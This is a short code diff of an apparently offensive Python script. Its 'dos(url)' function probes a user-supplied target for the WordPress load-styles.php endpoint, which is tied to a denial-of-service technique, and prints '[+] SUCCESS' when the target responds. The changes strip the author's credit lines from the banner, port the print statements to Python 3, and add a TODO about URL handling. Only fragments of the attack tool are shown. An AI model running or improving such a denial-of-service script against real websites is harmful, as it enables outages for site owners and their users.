@@ -9,8 +9,6 @@ ________          _________
  |    `   (  <_> )        \\
 /_______  /\\____/_______  /
         \\/              \\/
-Coded by : Akazh ID
-Facebook : fb.com/justakazh
 """)
 
 def dos(url):
@@ -23,12 +21,12 @@ def dos(url):
         res = req.text  
 
         if "window" in res:
-            print "[+] SUCCESS load-styles.php ==> " + url
+            print ("[+] SUCCESS load-styles.php ==> " + url)
         else:
-            print "[-] Failed ==> Maybe not Vuln or Server Down"
+            print ("[-] Failed ==> Maybe not Vuln or Server Down")
     except:
         pass
-
+#TODO: detect if its a link and add https or www if needed
 get = input("Target >> ")
 get.strip()
 i = 0
